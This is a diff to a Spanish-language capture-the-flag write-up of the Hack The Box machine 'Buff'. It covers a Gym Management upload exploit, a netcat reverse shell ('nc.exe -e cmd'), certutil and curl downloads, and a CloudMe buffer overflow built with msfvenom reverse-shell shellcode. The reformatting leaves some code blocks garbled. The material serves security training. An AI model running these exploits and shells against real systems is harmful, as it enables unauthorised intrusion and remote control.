@@ -23,15 +23,17 @@ Este video toca un BufferOverflow de typo OSCP. Necessitareis tener:
 - Una maquina windows7 32 bits
 - El Deb de la maquina esta desabilitado
 - Immunity debugger con el mona installado
+
 ## Enumeracion {-}
 
-### Reconocimiento de maquina, puertos abiertos y servicios {-} 
+### Reconocimiento de maquina, puertos abiertos y servicios {-}
 
 #### Ping {-}
 
 ```bash
 ping -c 1 10.10.10.198
 ```
+
 ttl: 127 -> maquina Windows
 
 #### Nmap {-}
@@ -63,13 +65,12 @@ whatweb http://10.10.10.198:8080
 
 Nada muy interressante aqui
 
-
 #### Checkear la web el puerto 8080 {-}
 
 - Vemos que hay un panel de inicio de session
 - El Wappalizer no nos dice nada
 - Hay unos cuantos links
-    
+
     1. Packages
     1. Facilities
     1. About
@@ -109,22 +110,27 @@ Analyzamos el script y lo comprobamos con firefox al mismo tiempo:
 
 1. Ir a la pagina /upload.php que no mirra para una session de usuario authentificado
 
-    - 
+    -
+
 ```bash
  http://10.10.10.198:8080/upload.php 
 ```
+
  Nos pone undefined id parameter.
 
 1. Ponerle un parametro id en la GET request que appunte en el fichero deseado
 
-    - 
+    -
+
 ```bash
  http://10.10.10.198:8080/upload.php?id=EEEE 
 ```
+
  nos hace algo.
 
 1. Bypasseamos un archivo con una doble extension. (.php.png)
-1. Bypasseamos el type check modificando el **Content-type** del fichero con 
+1. Bypasseamos el type check modificando el **Content-type** del fichero con
+
 ```bash
  image/png 
 ```
@@ -132,7 +138,6 @@ Analyzamos el script y lo comprobamos con firefox al mismo tiempo:
 1. Se pone un codigo malicioso en el body del fichero
 
 Estos passos se pueden facilmente hacer a mano pero aqui vamos a utilizar el proprio exploit.
-
 
 ## Vuln exploit & Gaining Access {-}
 
@@ -142,7 +147,7 @@ Estos passos se pueden facilmente hacer a mano pero aqui vamos a utilizar el pro
 python gym_management.py http://10.10.10.198:8080/
 ```
 
-Ya estamos en la maquina victima. Pero estamos con una web shell. 
+Ya estamos en la maquina victima. Pero estamos con una web shell.
 
 ### Reverse Shell {-}
 
@@ -167,11 +172,12 @@ curl http://10.10.14.8/nc.exe -o nc.exe
 ./nc.exe -e cmd 10.10.14.8 443
 ```
 
+Si le hacemos un type
 
-Si le hacemos un type 
 ```bash
  C:\users\shaun\Desktop\user.txt 
 ```
+
  podemos ver la flag.
 
 ### Analyzando la maquina {-}
@@ -193,10 +199,12 @@ mkdir EEEE
 cd EEEE
 ```
 
-Descargamos el 
+Descargamos el
+
 ```bash
  winpeasx64.exe 
 ```
+
  desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).
 
 ```bash
@@ -212,54 +220,64 @@ certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
 winPEAS.exe
 ```
 
-En la parte 
+En la parte
+
 ```bash
  Searching executable files in non-default folders with write (equivalent) permissions 
 ```
+
  vemos que
-el ususario shaun tiene AllAccess al ejecutable 
+el ususario shaun tiene AllAccess al ejecutable
+
 ```bash
  C:\Users\shaun\Downloads\CloudMe_1112.exe 
 ```
-. Mirando por internet 
-vemos que CloudMe es un servico que occupa el puerto **8888**. Lo comprobamos con 
+
+. Mirando por internet
+vemos que CloudMe es un servico que occupa el puerto **8888**. Lo comprobamos con
+
 ```bash
  netstat 
 ```
-
 
 A demas buscamos con searchsploit y vemos que este binario es vulnerable a un BufferOverflow.
 
 ## BufferOverflow {-}
 
 Aqui vamos a trabajar principalmente en la maquina windows. Analizando el exploit del BufferOverflow que nos da
-searchsploit vemos que podemos descargarnos el binario 
+searchsploit vemos que podemos descargarnos el binario
+
 ```bash
  CloudMe_1112.exe 
 ```
- en el link 
+
+ en el link
+
 ```bash
  https://www.cloudme.com/downloads/CloudMe_1112.exe 
 ```
+
 .
 Lo descargamos en la maquina Windows y lo installamos. La installacion es la typica de windows (next, next, next...).
 
 Nos tenemos que crear un usuario y iniciar una session.
 
-Una vez el programma lanzado, podemos comprobar que el servicio corre abriendo un cmd y lanzando el commando 
+Una vez el programma lanzado, podemos comprobar que el servicio corre abriendo un cmd y lanzando el commando
+
 ```bash
  netstat -nat 
 ```
+
 . Aqui vemos
 que el puerto 8888 esta corriendo.
 
 En esta situacion hay que entender que nosotros vamos a utilizar nuestra propria maquina windows como maquina de test. todo los passos siguientes
-estaran echo en esta maquina y tendremos que hacerlo de nuevo en la maquina Buff. 
+estaran echo en esta maquina y tendremos que hacerlo de nuevo en la maquina Buff.
 
 ### Exponer el puerto 8888 hacia fuera {-}
 
 Como este servicio es interno, el puerto 8888 no esta visible desde el exterior. Aqui utilizaremos **Chisel.exe** para hacer un port forwarding.
-Descargamos manualmente **Chisel y 7zip**. 
+Descargamos manualmente **Chisel y 7zip**.
 
 1. En la maquina de attackante
 
@@ -277,7 +295,6 @@ Descargamos manualmente **Chisel y 7zip**.
     ```bash
     ./chisel.exe client 192.168.0.16:1234 R:8888:127.0.0.1:8888
     ```
-
 
 ### Script en pyton para ejecutar el BufferOverflow {-}
 
@@ -316,10 +333,9 @@ if __name__ == "__main__":
     executeExploit()
 ```
 
-Ejecutando el script vemos que el CloudMe para de functionnar el la maquina Windows. 
+Ejecutando el script vemos que el CloudMe para de functionnar el la maquina Windows.
 
-
-![Buff-DOS](/assets/images/Buff-DOS.png) 
+![Buff-DOS](/assets/images/Buff-DOS.png)
 
 #### Etapa 2 : Analizando lo que pasa con Immunity Debugger {-}
 
@@ -341,21 +357,20 @@ En el Immunity debugger podemos ver que se a vuelto a PAUSEAR y en la ventanita 
 
 ##### Explicacion del stack {-}
 
-
 ```{r, echo = FALSE, fig.cap="BufferOverflow explicacion stack", out.width="90%"}
     knitr::include_graphics("images/Buff-stack_explanation.png")
 ```
 
+![Buff-stack_exlaatio](/assets/images/Buff-stack_explanation.png)
 
-![Buff-stack_exlaatio](/assets/images/Buff-stack_explanation.png) 
 ```{r, echo = FALSE, fig.cap="BufferOverflow overflow with A", out.width="90%"}
     knitr::include_graphics("images/Buff-As.png")
 ```
 
-Aqui se puede ver un monton de "41414141" que 41 es el valor Hexadecimal ASCII de la lettra A. 
+Aqui se puede ver un monton de "41414141" que 41 es el valor Hexadecimal ASCII de la lettra A.
 
+![Buff-As](/assets/images/Buff-As.png)
 
-![Buff-As](/assets/images/Buff-As.png) 
 #### Etapa 3: Sobre escribir el EIP {-}
 
 Como atacante, ahora tenemos que saver cuantas **A** tenemos que meter para sobre escribir el **EIP** con el valor que nosotros queremos meter.
@@ -430,16 +445,18 @@ if __name__ == "__main__":
 ```
 
 Una vez mas tenemos que lanzar el CloudMe porque previamente a petado. Tambien tenemos nuevamente que attachear al Immunity Debugger el servicio CloudMe.
-Lanzamos el script y vemos que el valor del EIP vale 
+Lanzamos el script y vemos que el valor del EIP vale
+
 ```bash
  316A4230 
 ```
 
+Con la herramienta
 
-Con la herramienta 
 ```bash
  pattern_offset 
 ```
+
  podemos comprovar cuantas **A** tengo que meter antes de sobre escribir la EIP
 
 ```bash
@@ -454,7 +471,7 @@ Ahora que tenemos el offset, vamos a modificar el script.
 #### Etapa 4: Encontrar la direccion donde despues del EIP {-}
 
 Aqui despues de añadir las **A** que tiene que tener 1052 de offset y las 4 **B** que seria el EIP, vamos a añadir
-500 **C** para buscar la direccion donde se sobre escribe el resto del programa. 
+500 **C** para buscar la direccion donde se sobre escribe el resto del programa.
 
 ```python
 #!/usr/bin/python3
@@ -488,14 +505,16 @@ if __name__ == "__main__":
 ```
 
 Si lanzamos el script, vemos en el Immunity debugger que el EIP vale ahora 42424242, es el punto donde savemos que tenemos el control
-del EIP. Ahora la pregunta es, que tiene que valer el EIP para poderle injectar los commandos que queremos. Pues en el Immunity debugger, 
-que el **ESP** contiene un monton de **C**. el ESP es la Stack. Si le hacemos un click derecho a la direccion y les damos a **Follow in Dumb**, 
+del EIP. Ahora la pregunta es, que tiene que valer el EIP para poderle injectar los commandos que queremos. Pues en el Immunity debugger,
+que el **ESP** contiene un monton de **C**. el ESP es la Stack. Si le hacemos un click derecho a la direccion y les damos a **Follow in Dumb**,
 en la parte baja de la izquierda vemos todas la **C** en formato raw.
 
-Al final aqui la direccion a la cual tenemos que appuntar es a la **ESP** 
+Al final aqui la direccion a la cual tenemos que appuntar es a la **ESP**
+
 ```bash
  0x0022D470 
 ```
+
  que es la pilla. El problema es que no podemos simplemente ponerle al
 EIP la direccion del ESP porque esto no va a funccionar. Tendremos aqui que usar un concepto que se llama **OPCODE**. El **OPCODE** son instrucciones
 a bajo nivel que nos permitte hacer un Jump al ESP llamado **JMPESP**.
@@ -504,7 +523,7 @@ Pero antes de mirrar el **OPCODE**, vamos a preparar el script malicioso que que
 
 #### Etapa 5: Preparacion del codigo malicioso {-}
 
-Como atacante, no queremos que el programa nos interprete una serie de **C** pero un codigo malicioso en caracteres Hexadecimal. 
+Como atacante, no queremos que el programa nos interprete una serie de **C** pero un codigo malicioso en caracteres Hexadecimal.
 El problema que puede surgir, es que algunos caracteres no se logren interpretar por el programa. Estos carateres son llamados **BadChars**.
 Tenemos que empezar por buscar estos **BadChars**.
 
@@ -512,11 +531,11 @@ Tenemos que empezar por buscar estos **BadChars**.
 
     A bajo de la ventana del Immunity Debugger, podemos entrar commandos. Aqui creamos un directorio para poder trabajar correctamente
 
-    - 
+    -
+
 ```bash
  !mona config -set workingfolder C:\Users\S4vitar\Desktop\%p 
 ```
-
 
     ```{r, echo = FALSE, fig.cap="Mona Set working directory", out.width="90%"}
         knitr::include_graphics("images/Buff-mona_set_wdir.png")
@@ -526,12 +545,14 @@ Tenemos que empezar por buscar estos **BadChars**.
 
     ```bash
     !mona bytearray -cpb "\x00"
-    quittamos de entrada el caracter 
+    quittamos de entrada el caracter
+
 ```bash
  x00 
 ```
+
  que es un **BadChars** bastante commun.
-![Buff-moa_set_wdir](/assets/images/Buff-mona_set_wdir.png) 
+![Buff-moa_set_wdir](/assets/images/Buff-mona_set_wdir.png)
 
 1. Enviamos todos estos caracteres en la pila para ver en que punto, o mejor dicho que carateres hacen quel programa pete.
 
@@ -584,9 +605,10 @@ Tenemos que empezar por buscar estos **BadChars**.
     ```
 
 En el caso que nos reporte **BadChars** tendriamos que quitarlos de la lista y volver a effectuar lo mismo hasta que no
-tengamos mas **BadChars**. Y desde aqui nos podemos crear el script malicioso con la lista de caracteres que tenemos. En 
+tengamos mas **BadChars**. Y desde aqui nos podemos crear el script malicioso con la lista de caracteres que tenemos. En
 
-![Buff-BadChars](/assets/images/Buff-BadChars.png) 
+![Buff-BadChars](/assets/images/Buff-BadChars.png)
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.16 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
 ```
@@ -662,8 +684,10 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     ```
 
 1. Buscamos una dll que tenga todas las protecciones a False
+
     ```
-![Buff-jmes](/assets/images/Buff-jmpesp.png) 
+
+![Buff-jmes](/assets/images/Buff-jmpesp.png)
 
 1. En internet buscamos el opcode [defuse.ca](https://defuse.ca/online-x86-assembler.htm)
 
@@ -671,10 +695,12 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     knitr::include_graphics("images/Buff-protection_false.png")
     ```
 
-1. Buscar el opcode (en este caso 
+1. Buscar el opcode (en este caso
+
 ```bash
  ff e4 
 ```
+
 ) en la dll.
 
     ```bash
@@ -682,13 +708,13 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     ```
 
     knitr::include_graphics("images/Buff-execution-rights-jmpesp.png")
-![Buff-rotectio_false](/assets/images/Buff-protection_false.png) 
+![Buff-rotectio_false](/assets/images/Buff-protection_false.png)
     ```
 
 1. Cambiamos el script poniendole la nueva direccion
 
     import socket
-![Buff-rotectio_false](/assets/images/Buff-protection_false.png) 
+![Buff-rotectio_false](/assets/images/Buff-protection_false.png)
     import signal
     import pdb
     import sys
@@ -696,11 +722,13 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     from pwn import *
     from struct import pack
 
-    # Variables globales
+   # Variables globales
+
     remoteAddress = "127.0.0.1"
 
             b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
-![Buff-executio-rihts-jmes](/assets/images/Buff-execution-rights-jmpesp.png) 
+
+![Buff-executio-rihts-jmes](/assets/images/Buff-execution-rights-jmpesp.png)
             b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
             b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
             b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
@@ -740,17 +768,17 @@ Aqui hay que tener en cuenta el echo que nuestra shell code esta cifrada y que t
 el codigo nos salte al ESP tenga tiempo para desencryptar el codigo. Para esto tenemos dos possibilidades.
 
 - Añdir al shell code unos No Operation code **NOPS**
-- Effectuar un desplazamiento de la pila con la instruccion 
+- Effectuar un desplazamiento de la pila con la instruccion
+
 ```bash
  sub esp, 0x10 
 ```
 
+Que simplemente es, en el caso de las NOPS, añadir codigo que no hace nada. Se hacen con el caracter Hexadecimal
 
-Que simplemente es, en el caso de las NOPS, añadir codigo que no hace nada. Se hacen con el caracter Hexadecimal 
 ```bash
  \x90 
 ```
-
 
 ```python
  #!/usr/bin/python3
@@ -857,5 +885,5 @@ if __name__ == "__main__":
     ```
 
 Y ya emos ganados accesso al systema como el usuario que ha lanzado el servicio.
-Se puede ahora cambiar el script para que apunte a la maquina victima y ejecutar otra vez el msfvenom para que 
+Se puede ahora cambiar el script para que apunte a la maquina victima y ejecutar otra vez el msfvenom para que
 appunte a la buena ip y estamos como administrator.
